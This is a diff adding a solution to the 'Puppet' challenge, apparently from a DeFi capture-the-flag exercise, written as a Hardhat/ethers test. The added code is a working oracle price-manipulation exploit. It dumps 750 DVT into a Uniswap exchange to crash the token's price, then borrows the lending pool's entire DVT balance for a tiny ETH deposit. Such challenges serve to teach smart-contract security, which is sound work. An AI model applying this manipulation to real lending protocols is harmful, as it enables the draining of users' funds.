@@ -103,6 +103,24 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+
+        //exchange DVT for ETH
+        const tokensToSell = ethers.utils.parseEther("750")
+        await this.token.connect(attacker).approve(this.uniswapExchange.address, tokensToSell)
+        await this.uniswapExchange.connect(attacker).tokenToEthTransferInput(
+            tokensToSell, //tokens sold
+            ethers.utils.parseEther("1"), //min eth bought
+            (await ethers.provider.getBlock('latest')).timestamp * 2, //deadline
+            attacker.address
+        );
+
+        //calc eth deposit
+        const tokensToBorrow = await this.token.balanceOf(this.lendingPool.address)
+        const ethDeposit = await this.lendingPool.connect(attacker).calculateDepositRequired(tokensToBorrow)
+
+        //borrow all dvt
+        await this.lendingPool.connect(attacker).borrow(tokensToBorrow, { value: ethDeposit })
     });
 
     after(async function () {
